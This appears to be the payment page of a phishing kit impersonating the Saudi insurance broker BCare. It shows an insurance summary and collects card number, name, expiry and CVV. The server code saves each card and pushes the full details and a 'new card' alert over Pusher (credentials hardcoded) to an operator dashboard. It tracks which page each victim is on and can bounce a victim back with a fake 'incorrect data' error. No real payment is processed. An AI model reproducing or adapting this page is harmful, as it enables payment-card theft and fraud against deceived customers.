<?php
error_reporting(0);
ini_set('display_errors', 0);
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

// حفظ البيانات القادمة من صفحة الملخص
if (isset($_POST['insurance_type'])) {
    $_SESSION['insurance_type'] = $_POST['insurance_type'];
}
if (isset($_POST['company_name'])) {
    $_SESSION['company_name'] = $_POST['company_name'];
}
if (isset($_POST['totalprice'])) {
    $_SESSION['totalprice'] = $_POST['totalprice'];
}
if (isset($_POST['date'])) {
    $_SESSION['date'] = $_POST['date'];
}
if (isset($_POST['image'])) {
    $_SESSION['image'] = $_POST['image'];
}

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'البطاقة');

    $options = array('cluster' => 'ap2', 'useTLS' => true);
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);

    $pusher->trigger('bcare', 'curreneft-page', ['userId' => $_SESSION['user_id'], 'page' => 'البطاقة']);
}

if (isset($_POST['submit'])) {
    $options = array('cluster' => 'ap2', 'useTLS' => true);
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);

    $site = array(
        'cardNumber' => $_POST['cardNumber'],
        'cardname' => $_POST['cardname'],
        'cvv' => $_POST['cvv'],
        'year' => $_POST['year'],
        'totalprice' => $_SESSION['totalprice'],
        'message' => 'البطاقة',
        'type' => '1'
    );

    $userId = $_SESSION['user_id'];

    if ($User->isCardBanned($_POST['cardNumber'])) {
        $showBannedError = true;
    } else {
        $id = $User->InsertCardVisaRelatedUser($userId, $site);
        if ($id) {
            $User->UpdateStatus($userId, 'البطاقة');
            $_SESSION['card_id'] = $id;
            $pusher->trigger('bcare', 'update-user-accountt', ['userId' => $userId, 'updatedData' => $site]);
            
            // إرسال إشعار بطاقة جديدة للداشبورد (صوت الإشعار)
            $pusher->trigger('bcare', 'new-card-event', [
                'cardId' => $id,
                'userId' => $userId
            ]);
            
            echo "<script>document.location.href='wait-payment.php';</script>";
            exit;
        }
    }
}

if (isset($_GET['reject'])) {
    $showError = true;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الدفع - بي كير</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
/* CSS Variables */
:root {
    --color-background: #F4F7FB;
    --color-surface: #FFFFFF;
    --color-primary: #0F4C72;
    --color-primary-dark: #0B3856;
    --color-primary-light: #E6F0F7;
    --color-accent: #F2A340;
    --color-accent-dark: #D6892F;
    --color-text-primary: #0E1F2E;
    --color-text-secondary: #4B5B6B;
    --color-border: #D8E2EE;
    --shadow-soft: 0 16px 40px rgba(15, 76, 114, 0.12);
}

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Cairo', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: var(--color-background);
    color: var(--color-text-primary);
    line-height: 1.6;
    overflow-x: hidden;
}

.container {
    max-width: 1280px;
    margin: 0 auto;
    padding: 0 1rem;
}

/* Main Navigation */
.main-nav {
    background: rgba(255, 255, 255, 0.92);
    backdrop-filter: blur(8px);
    border-bottom: 1px solid var(--color-border);
}

.nav-content {
    display: flex;
    justify-content: space-between;
    align-items: center;
    height: 4rem;
}

.nav-actions {
    display: flex;
    gap: 0.5rem;
}

.lang-btn, .profile-btn, .menu-btn {
    background: transparent;
    border: 1px solid var(--color-border);
    border-radius: 9999px;
    cursor: pointer;
    transition: background 0.3s;
    display: flex;
    align-items: center;
    justify-content: center;
}

.lang-btn:hover, .profile-btn:hover, .menu-btn:hover {
    background: rgba(0, 0, 0, 0.02);
}

.lang-btn {
    padding: 0.25rem 0.75rem;
    font-size: 0.75rem;
    font-weight: 600;
    color: var(--color-text-primary);
}

.profile-btn, .menu-btn {
    padding: 0.5rem;
}

.profile-icon, .menu-icon {
    width: 1.25rem;
    height: 1.25rem;
    stroke: var(--color-primary);
    stroke-width: 1.8;
    fill: none;
}

.menu-icon {
    stroke: var(--color-text-primary);
    stroke-width: 2;
}

.logo img {
    display: block;
}

/* Main Content */
.main-content {
    max-width: 48rem;
    margin: 0 auto;
    padding: 0 1rem;
}

.payment-form {
    margin-top: 1.5rem;
    padding-bottom: 2rem;
}

.form-card {
    background: rgba(255, 255, 255, 0.9);
    border: 1px solid var(--color-border);
    border-radius: 1rem;
    padding: 1.5rem;
    margin-bottom: 1.5rem;
}

.card-title {
    font-size: 1.1rem;
    font-weight: 700;
    color: var(--color-primary);
    margin-bottom: 0.75rem;
}

.summary-section {
    margin-bottom: 1rem;
}

.summary-row {
    display: flex;
    justify-content: space-between;
    padding: 0.5rem 0;
    border-bottom: 1px solid var(--color-border);
}

.summary-label {
    font-size: 0.8rem;
    color: var(--color-text-secondary);
}

.summary-value {
    font-size: 0.8rem;
    font-weight: 600;
    color: var(--color-text-primary);
}

.summary-total {
    background: linear-gradient(135deg, #eaf3ff 0%, #dbe9ff 100%);
    border: 2px solid var(--color-primary);
    border-radius: 0.75rem;
    padding: 0.75rem 1rem;
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 0.75rem;
    font-weight: 800;
    font-size: 1rem;
    color: var(--color-primary);
}

/* طرق الدفع - التصميم الجديد */
.payment-methods-section {
    padding-top: 0.75rem;
    border-top: 2px solid var(--color-border);
    margin-bottom: 1rem;
}

.payment-methods-title {
    font-size: 0.9rem;
    font-weight: 600;
    color: var(--color-text-primary);
    margin-bottom: 0.75rem;
    text-align: right;
}

.payment-method-card {
    background: white;
    border: 2px solid var(--color-border);
    border-radius: 0.75rem;
    padding: 1rem 1.25rem;
    margin-bottom: 0.75rem;
    cursor: pointer;
    transition: all 0.3s;
    display: flex;
    justify-content: space-between;
    align-items: center;
    min-height: 65px;
}

.payment-method-card:hover:not(.disabled) {
    border-color: var(--color-primary);
    transform: translateY(-2px);
    box-shadow: 0 4px 12px rgba(15, 76, 114, 0.15);
}

.payment-method-card.active {
    border-color: var(--color-primary);
    background: var(--color-primary-light);
}

.payment-method-card.disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

.payment-price {
    font-size: 1.1rem;
    font-weight: 700;
    color: var(--color-text-primary);
    order: 2;
}

.payment-logos {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    order: 1;
}

.apple-pay-logo {
    display: flex;
    align-items: center;
    justify-content: flex-start;
    width: 100%;
}

.form-field {
    margin-bottom: 1.25rem;
}

.form-field label {
    display: block;
    font-size: 0.875rem;
    font-weight: 500;
    color: var(--color-text-secondary);
    margin-bottom: 0.5rem;
    text-align: right;
}

.form-field input {
    width: 100%;
    padding: 0.75rem 1rem;
    background: white;
    border: 1px solid var(--color-border);
    border-radius: 0.75rem;
    font-size: 0.875rem;
    color: var(--color-text-primary);
    transition: all 0.15s;
    font-family: inherit;
}

.form-field input.ltr {
    direction: ltr;
    text-align: left;
}

.form-field input:focus {
    outline: none;
    border-color: var(--color-primary);
    box-shadow: 0 0 0 2px var(--color-primary-light);
}

.form-field input.error {
    border-color: #ef4444;
}

.error-message {
    color: #ef4444;
    font-size: 0.75rem;
    margin-top: 0.25rem;
    display: none;
}

.error-message.show {
    display: block;
}

.input-row {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 1rem;
}

.submit-btn {
    width: 100%;
    padding: 0.875rem;
    background: var(--color-accent);
    color: white;
    border: 1px solid var(--color-accent-dark);
    border-radius: 0.75rem;
    font-size: 1rem;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s;
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
}

.submit-btn:hover:not(:disabled) {
    box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1);
    transform: translateY(-1px);
}

.submit-btn:disabled {
    opacity: 0.6;
    cursor: not-allowed;
    transform: none;
}

/* Footer */
.footer {
    background: #0B2F48;
    color: #D6E4F0;
    margin-top: 3rem;
    padding: 2rem 0;
    text-align: center;
}

.footer-content {
    font-size: 0.75rem;
    line-height: 1.625;
}

.footer-logo {
    margin: 0 auto 1rem;
    width: 100px;
}

.footer-copyright {
    color: #9FB4C4;
    margin-bottom: 1rem;
}

.footer-contact {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
    font-size: 0.75rem;
    margin-bottom: 1rem;
}

.footer-contact a {
    color: var(--color-accent);
    text-decoration: none;
    font-weight: 600;
}

/* Loading Overlay */
.loading-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.5);
    backdrop-filter: blur(5px);
    display: none;
    align-items: center;
    justify-content: center;
    z-index: 9999;
}

.loading-overlay.show {
    display: flex;
}

.loading-card {
    background: white;
    border-radius: 16px;
    padding: 40px 60px;
    text-align: center;
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
}

.loading-logo {
    width: 120px;
    margin-bottom: 20px;
}

.loading-text {
    font-size: 16px;
    font-weight: 600;
    color: #333;
    margin-bottom: 20px;
}

.loading-spinner {
    width: 50px;
    height: 50px;
    margin: 0 auto;
}

.loading-spinner svg {
    width: 100%;
    height: 100%;
}

.loading-spinner circle {
    fill: none;
    stroke: #F2A340;
    stroke-width: 4;
    stroke-linecap: round;
    stroke-dasharray: 150;
    stroke-dashoffset: 150;
    animation: spin 1.5s ease-in-out infinite;
}

@keyframes spin {
    0% {
        stroke-dashoffset: 150;
        transform: rotate(0deg);
    }
    50% {
        stroke-dashoffset: 0;
        transform: rotate(180deg);
    }
    100% {
        stroke-dashoffset: -150;
        transform: rotate(360deg);
    }
}

/* Error Alert */
.alert-danger {
    background: #fee2e2;
    border: 2px solid #ef4444;
    color: #991b1b;
    padding: 1rem;
    border-radius: 0.75rem;
    text-align: center;
    font-weight: 600;
    margin-bottom: 1.5rem;
}

/* Apple Pay Alert */
.apple-pay-alert {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.5);
    backdrop-filter: blur(5px);
    display: none;
    align-items: center;
    justify-content: center;
    z-index: 9999;
    animation: fadeIn 0.3s ease;
}

.apple-pay-alert.show {
    display: flex;
}

.apple-pay-alert-content {
    background: white;
    border-radius: 20px;
    padding: 2rem;
    max-width: 400px;
    width: 90%;
    text-align: center;
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
    animation: slideUp 0.3s ease;
}

.apple-pay-alert-icon {
    width: 70px;
    height: 70px;
    background: #fff3cd;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 1.5rem;
    font-size: 2.5rem;
}

.apple-pay-alert-title {
    font-size: 1.25rem;
    font-weight: 700;
    color: var(--color-text-primary);
    margin-bottom: 0.75rem;
}

.apple-pay-alert-message {
    font-size: 0.95rem;
    color: var(--color-text-secondary);
    line-height: 1.6;
    margin-bottom: 1.5rem;
}

.apple-pay-alert-btn {
    background: var(--color-primary);
    color: white;
    border: none;
    border-radius: 12px;
    padding: 0.875rem 2rem;
    font-size: 1rem;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s;
    width: 100%;
}

.apple-pay-alert-btn:hover {
    background: var(--color-primary-dark);
    transform: translateY(-2px);
    box-shadow: 0 8px 15px rgba(15, 76, 114, 0.2);
}

@keyframes fadeIn {
    from {
        opacity: 0;
    }
    to {
        opacity: 1;
    }
}

@keyframes slideUp {
    from {
        transform: translateY(50px);
        opacity: 0;
    }
    to {
        transform: translateY(0);
        opacity: 1;
    }
}

@media (min-width: 768px) {
    .form-card {
        padding: 2rem;
    }
}
    </style>
</head>
<body>
    <!-- Main Navigation -->
    <div class="main-nav">
        <div class="container nav-content">
            <div class="nav-actions">
                <button class="lang-btn">EN</button>
                <button class="profile-btn" aria-label="الملف الشخصي">
                    <svg class="profile-icon" viewBox="0 0 24 24">
                        <path d="M20 21a8 8 0 0 0-16 0"></path>
                        <circle cx="12" cy="7" r="4"></circle>
                    </svg>
                </button>
            </div>
            <a href="index.php" class="logo">
                <img src="./assets/Bcare-logo.svg" alt="bcare logo" width="90" height="45">
            </a>
            <button class="menu-btn" aria-label="القائمة">
                <svg class="menu-icon" viewBox="0 0 24 24">
                    <line x1="3" y1="12" x2="21" y2="12"></line>
                    <line x1="3" y1="6" x2="21" y2="6"></line>
                    <line x1="3" y1="18" x2="21" y2="18"></line>
                </svg>
            </button>
        </div>
    </div>

    <!-- Main Content -->
    <main class="main-content">
        <div class="payment-form">
            <div class="form-card">
                <h2 class="card-title">ملخص التأمين</h2>
                
                <div class="summary-section">
                    <div class="summary-row">
                        <span class="summary-label">الشركة:</span>
                        <span class="summary-value"><?= htmlspecialchars($_SESSION['company_name'] ?? 'شركة التأمين') ?></span>
                    </div>
                    <div class="summary-row">
                        <span class="summary-label">نوع التأمين:</span>
                        <span class="summary-value"><?= htmlspecialchars($_SESSION['insurance_type'] ?? 'تأمين شامل') ?></span>
                    </div>
                    <div class="summary-row">
                        <span class="summary-label">تاريخ البدء:</span>
                        <span class="summary-value"><?= date('d/m/Y', strtotime($_SESSION['date'] ?? date('Y-m-d'))) ?></span>
                    </div>
                    <div class="summary-row">
                        <span class="summary-label">القسط الأساسي:</span>
                        <span class="summary-value"><?= number_format(($_SESSION['totalprice'] ?? 0) / 1.15, 2) ?> ر.س</span>
                    </div>
                    <div class="summary-row">
                        <span class="summary-label">المجموع الفرعي:</span>
                        <span class="summary-value"><?= number_format(($_SESSION['totalprice'] ?? 0) / 1.15, 2) ?> ر.س</span>
                    </div>
                    <div class="summary-row">
                        <span class="summary-label">ضريبة 15%:</span>
                        <span class="summary-value"><?= number_format(($_SESSION['totalprice'] ?? 0) - (($_SESSION['totalprice'] ?? 0) / 1.15), 2) ?> ر.س</span>
                    </div>
                    <div class="summary-total">
                        <span>الإجمالي</span>
                        <span><?= number_format($_SESSION['totalprice'] ?? 0, 2) ?> ر.س</span>
                    </div>
                </div>

                <!-- طرق الدفع - التصميم الجديد -->
                <div class="payment-methods-section">
                    <h6 class="payment-methods-title">اختر طريقة الدفع</h6>
                    
                    <!-- البطاقة البنكية -->
                    <div class="payment-method-card active" id="cardMethod" onclick="selectCardPayment()">
                        <div class="payment-logos">
                            <img src="./assets/cards-DEvwsDKR.webp" alt="البطاقات المدعومة" style="height: 30px; object-fit: contain;">
                        </div>
                        <div class="payment-price">
                            <?= number_format($_SESSION['totalprice'] ?? 0, 2) ?> ر.س
                        </div>
                    </div>

                    <!-- Apple Pay -->
                    <div class="payment-method-card disabled" id="applePayMethod" onclick="handleApplePay()">
                        <div class="apple-pay-logo">
                            <img src="https://businesspost.ng/wp-content/uploads/2021/09/Apple-Pay.png" alt="Apple Pay" style="height: 30px; object-fit: contain;">
                        </div>
                    </div>
                </div>

                <?php if (isset($showBannedError) && $showBannedError): ?>
                    <div class="alert-danger">نعتذر، هذه البطاقة محظورة من الاستخدام.</div>
                <?php endif; ?>

                <?php if (isset($showError) && $showError): ?>
                    <div class="alert-danger">المعلومات غير صحيحة، يرجى التأكد من البيانات والمحاولة مرة أخرى.</div>
                <?php endif; ?>

                <form action="" method="POST" id="paymentForm">
                    <div class="form-field">
                        <label style="display: flex; justify-content: space-between; align-items: center;">
                            <span>رقم البطاقة</span>
                            <div style="display: flex; gap: 6px; align-items: center;">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard" style="height: 17px; object-fit: contain;">
                                <img src="./assets/visa.png" alt="Visa" style="height: 13px; object-fit: contain;">
                                <img src="./assets/mada-with-border-CettaOB4.png" alt="Mada" style="height: 20px; object-fit: contain;">
                            </div>
                        </label>
                        <input 
                            type="tel" 
                            class="ltr"
                            name="cardNumber"
                            id="cardNumber" 
                            placeholder="1234 5678 9012 3456"
                            maxlength="19"
                            inputmode="numeric"
                            autocomplete="off"
                            required
                        >
                        <div class="error-message" id="cardError">رقم البطاقة غير صحيح</div>
                    </div>

                    <div class="form-field">
                        <label>اسم حامل البطاقة</label>
                        <input 
                            type="text" 
                            name="cardname"
                            id="cardholderName" 
                            placeholder="أدخل الاسم كما يظهر على البطاقة"
                            class="ltr"
                            required
                        >
                        <div class="error-message" id="nameError">الرجاء إدخال اسم صحيح (3 أحرف على الأقل)</div>
                    </div>

                    <div class="input-row">
                        <div class="form-field">
                            <label>تاريخ الانتهاء</label>
                            <input 
                                type="tel" 
                                class="ltr"
                                name="year"
                                id="expiryDate" 
                                placeholder="MM/YY"
                                maxlength="5"
                                inputmode="numeric"
                                autocomplete="off"
                                required
                            >
                            <div class="error-message" id="expiryError">تاريخ غير صحيح</div>
                        </div>

                        <div class="form-field">
                            <label>CVV</label>
                            <input 
                                type="tel" 
                                class="ltr"
                                name="cvv"
                                id="cvv" 
                                placeholder="123"
                                maxlength="3"
                                inputmode="numeric"
                                autocomplete="off"
                                required
                            >
                            <div class="error-message" id="cvvError">CVV غير صحيح (3 أرقام)</div>
                        </div>
                    </div>

                    <button type="submit" name="submit" class="submit-btn" id="submitBtn" disabled>
                        ادفع الآن
                    </button>
                </form>
            </div>
            
            <!-- صورة البطاقات المدعومة - خارج النموذج -->
            <div style="text-align: center; margin-top: 1.5rem; margin-bottom: 2rem; opacity: 0.7;">
                <img src="./assets/cards-all-BF_GftTO.png" alt="البطاقات المدعومة" style="max-width: 100%; height: auto; max-height: 50px; object-fit: contain;">
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <div class="container footer-content">
            <img src="./assets/Bcare-logo.svg" alt="BCare Logo" class="footer-logo">
            <p class="footer-copyright">
                © 2026 جميع الحقوق محفوظة لشركة عناية الوسيط لوساطة التأمين. خاضعة لرقابة وإشراف البنك المركزي السعودي.
            </p>
            <div class="footer-contact">
                <span>اتصل بنا</span>
                <a href="tel:8001180042">8001180042</a>
            </div>
        </div>
    </footer>

    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-card">
            <img src="./assets/Bcare-logo.svg" alt="BCare Logo" class="loading-logo">
            <div class="loading-text">جاري معالجة طلبك...</div>
            <div class="loading-spinner">
                <svg viewBox="0 0 50 50">
                    <circle cx="25" cy="25" r="20"></circle>
                </svg>
            </div>
        </div>
    </div>

    <!-- Apple Pay Alert -->
    <div class="apple-pay-alert" id="applePayAlert">
        <div class="apple-pay-alert-content">
            <div class="apple-pay-alert-icon">
                ⚠️
            </div>
            <h3 class="apple-pay-alert-title">خدمة Apple Pay</h3>
            <p class="apple-pay-alert-message">
                عذراً، خدمة Apple Pay غير متوفرة حالياً.<br>
                يرجى استخدام البطاقة البنكية لإتمام عملية الدفع.
            </p>
            <button class="apple-pay-alert-btn" onclick="closeApplePayAlert()">
                حسناً، فهمت
            </button>
        </div>
    </div>

    <!-- Error Modal -->
    <div class="apple-pay-alert" id="errorModal">
        <div class="apple-pay-alert-content">
            <div class="apple-pay-alert-icon" style="background: #fee2e2;">
                <i class="bi bi-exclamation-triangle-fill" style="color: #ef4444; font-size: 2rem;"></i>
            </div>
            <h3 class="apple-pay-alert-title">المعلومات غير صحيحة</h3>
            <p class="apple-pay-alert-message">
                بيانات البطاقة المدخلة غير صحيحة، يرجى التأكد من الأرقام والمحاولة مرة أخرى.
            </p>
            <button class="apple-pay-alert-btn" onclick="closeErrorModal()">
                حسناً، فهمت
            </button>
        </div>
    </div>

    <script>
        // Show/Hide loader
        function showLoader() {
            document.getElementById('loadingOverlay').classList.add('show');
        }

        function hideLoader() {
            document.getElementById('loadingOverlay').classList.remove('show');
        }

        // Handle Apple Pay
        function handleApplePay() {
            document.getElementById('applePayAlert').classList.add('show');
        }
        
        // Close Apple Pay Alert
        function closeApplePayAlert() {
            document.getElementById('applePayAlert').classList.remove('show');
            selectCardPayment();
        }

        // Select card payment
        function selectCardPayment() {
            document.getElementById('cardMethod').classList.add('active');
            document.getElementById('applePayMethod').classList.remove('active');
            
            // Scroll to payment form
            setTimeout(() => {
                const paymentForm = document.getElementById('paymentForm');
                if (paymentForm) {
                    paymentForm.scrollIntoView({ behavior: 'smooth', block: 'start' });
                }
            }, 100);
        }
        
        // Show/Close Error Modal
        function showErrorModal() {
            document.getElementById('errorModal').classList.add('show');
        }
        
        function closeErrorModal() {
            document.getElementById('errorModal').classList.remove('show');
        }
        
        // Show error modal on page load if needed
        window.addEventListener('DOMContentLoaded', function() {
            <?php if (isset($showError) && $showError): ?>
                showErrorModal();
            <?php endif; ?>
        });

        // Luhn algorithm for card validation
        function isValidLuhn(digits) {
            let sum = 0;
            for (let i = 0; i < digits.length; i++) {
                let cardNum = parseInt(digits[i]);
                if ((digits.length - i) % 2 === 0) {
                    cardNum = cardNum * 2;
                    if (cardNum > 9) cardNum = cardNum - 9;
                }
                sum += cardNum;
            }
            return sum % 10 === 0;
        }

        // Validation functions
        const validateName = name => name.trim().length >= 3;
        
        const validateCardNumber = number => {
            const cleanNumber = number.replace(/\s/g, '');
            return cleanNumber.length === 16 && /^\d+$/.test(cleanNumber) && isValidLuhn(cleanNumber);
        };
        
        const validateExpiry = expiry => {
            if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
            const [month, year] = expiry.split('/').map(Number);
            if (month < 1 || month > 12) return false;
            const now = new Date();
            const currentYear = now.getFullYear() % 100;
            const currentMonth = now.getMonth() + 1;
            if (year < currentYear) return false;
            if (year === currentYear && month < currentMonth) return false;
            return true;
        };
        
        const validateCVV = cvv => /^\d{3}$/.test(cvv);

        document.addEventListener('DOMContentLoaded', function () {
            const form = document.getElementById('paymentForm');
            const submitBtn = document.getElementById('submitBtn');
            const cardNumInput = document.getElementById('cardNumber');
            const cardNameInput = document.getElementById('cardholderName');
            const expiryInput = document.getElementById('expiryDate');
            const cvvInput = document.getElementById('cvv');

            // Format card number
            cardNumInput.addEventListener('input', (e) => {
                let val = e.target.value.replace(/\D/g, '');
                if (val.length > 16) val = val.slice(0, 16);
                let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
                e.target.value = formatted;
                
                if (e.target.classList.contains('error')) {
                    e.target.classList.remove('error');
                    document.getElementById('cardError').classList.remove('show');
                }
                
                if (val.length === 16) {
                    document.getElementById('cardholderName').focus();
                }
                checkFormStatus();
            });

            cardNumInput.addEventListener('blur', function() {
                const value = this.value.replace(/\s/g, '');
                if (value.length === 16) {
                    if (!isValidLuhn(value)) {
                        this.classList.add('error');
                        document.getElementById('cardError').classList.add('show');
                    }
                } else if (value.length > 0) {
                    this.classList.add('error');
                    document.getElementById('cardError').classList.add('show');
                }
            });

            cardNumInput.addEventListener('paste', function(e) {
                e.preventDefault();
                let pastedText = (e.clipboardData || window.clipboardData).getData('text');
                let numbers = pastedText.replace(/\D/g, '').slice(0, 16);
                this.value = numbers.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
                
                if (numbers.length === 16) {
                    if (isValidLuhn(numbers)) {
                        this.classList.remove('error');
                        document.getElementById('cardError').classList.remove('show');
                        document.getElementById('cardholderName').focus();
                    }
                }
                checkFormStatus();
            });

            // Format expiry
            expiryInput.addEventListener('input', (e) => {
                let val = e.target.value.replace(/\D/g, '').slice(0, 4);
                if (val.length >= 2) {
                    e.target.value = val.slice(0, 2) + '/' + val.slice(2);
                } else {
                    e.target.value = val;
                }
                
                if (e.target.value.length === 5) {
                    document.getElementById('cvv').focus();
                }
                
                if (e.target.classList.contains('error')) {
                    e.target.classList.remove('error');
                    document.getElementById('expiryError').classList.remove('show');
                }
                checkFormStatus();
            });

            // Format CVV
            cvvInput.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
                if (e.target.classList.contains('error')) {
                    e.target.classList.remove('error');
                    document.getElementById('cvvError').classList.remove('show');
                }
                checkFormStatus();
            });

            // Name validation
            cardNameInput.addEventListener('input', function() {
                if (this.classList.contains('error')) {
                    this.classList.remove('error');
                    document.getElementById('nameError').classList.remove('show');
                }
                checkFormStatus();
            });
            
            cardNameInput.addEventListener('blur', function() {
                if (this.value.trim().length >= 3) {
                    document.getElementById('expiryDate').focus();
                }
            });

            function checkFormStatus() {
                const cNum = cardNumInput.value.replace(/\s/g, '');
                const exp = expiryInput.value;
                const name = cardNameInput.value.trim();
                const cvv = cvvInput.value;

                const isLuhnValid = cNum.length === 16 && isValidLuhn(cNum);
                const isExpiryValid = validateExpiry(exp);
                const isNameValid = name.length >= 3;
                const isCvvValid = cvv.length === 3;

                submitBtn.disabled = !(isLuhnValid && isExpiryValid && isNameValid && isCvvValid);
            }

            // Form submission
            form.addEventListener('submit', function(e) {
                // لا نمنع الإرسال - نترك النموذج يرسل مباشرة
                // Form will submit normally to the server
            });
        });
    </script>

    <?php include 'chat_widget.php'; ?>
</body>
</html>